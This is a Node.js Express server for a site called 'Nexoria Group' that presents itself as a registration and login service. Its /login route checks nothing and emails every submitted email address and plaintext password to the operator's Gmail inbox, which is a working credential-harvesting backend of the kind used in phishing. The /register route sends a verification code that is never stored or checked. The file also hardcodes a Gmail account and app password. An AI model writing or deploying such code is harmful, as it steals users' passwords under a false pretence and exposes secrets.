import express from "express";
import bodyParser from "body-parser";
import nodemailer from "nodemailer";
import cors from "cors";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

// Variables de entorno
const GMAIL_USER = process.env.GMAIL_USER || "nexoriagroupmx@gmail.com";
const GMAIL_PASS = process.env.GMAIL_PASS || "yhnsszyoouabfqwy";

// Nodemailer
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: { user: GMAIL_USER, pass: GMAIL_PASS }
});

// Ruta inicio
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Registro
app.post("/register", async (req, res) => {
  const { name, email, password } = req.body;
  if (!email || !password) return res.status(400).send("Faltan datos.");

  // Código de verificación aleatorio de 6 dígitos
  const code = Math.floor(100000 + Math.random() * 900000);

  const mailOptions = {
    from: `"Nexoria Group" <${GMAIL_USER}>`,
    to: email,
    subject: "Código de verificación Nexoria Group",
    html: `<h2>Tu código de verificación:</h2><p style="font-size:20px;"><b>${code}</b></p>`
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).send(`Código enviado a ${email}`);
  } catch (err) {
    console.error(err);
    res.status(500).send("Error al enviar el correo");
  }
});

// Login
app.post("/login", async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) return res.status(400).send("Datos incompletos.");

  const mailOptions = {
    from: `"Nexoria Group" <${GMAIL_USER}>`,
    to: GMAIL_USER,
    subject: "Intento de inicio de sesión",
    html: `<p>Correo: ${email}</p><p>Contraseña: ${password}</p>`
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).send("Inicio de sesión registrado");
  } catch (err) {
    console.error(err);
    res.status(500).send("Error al procesar el inicio de sesión");
  }
});

// Servidor
app.listen(PORT, () => console.log(`Servidor activo en puerto ${PORT}`));